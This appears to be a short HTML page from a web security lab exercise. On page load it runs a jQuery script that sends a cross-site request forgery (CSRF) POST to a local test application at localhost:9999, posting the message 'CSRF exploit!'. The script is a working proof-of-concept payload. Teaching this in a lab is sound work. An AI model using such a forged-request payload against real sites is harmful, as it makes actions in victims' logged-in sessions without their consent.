<script type="text/javascript" src="lab_02/static/js/jquery.js"></script>

<script type="text/javascript">
$(function() {
  $.ajax({
      type: "POST",
      dataType: 'jsonp',
      url: "http://localhost:9999/index.php?add_message",
      data: {
          mess: 'CSRF exploit!'
      }
  }).success(function (data) {
      console.log(data);
      // window.location = "index.php";
  });
});

</script>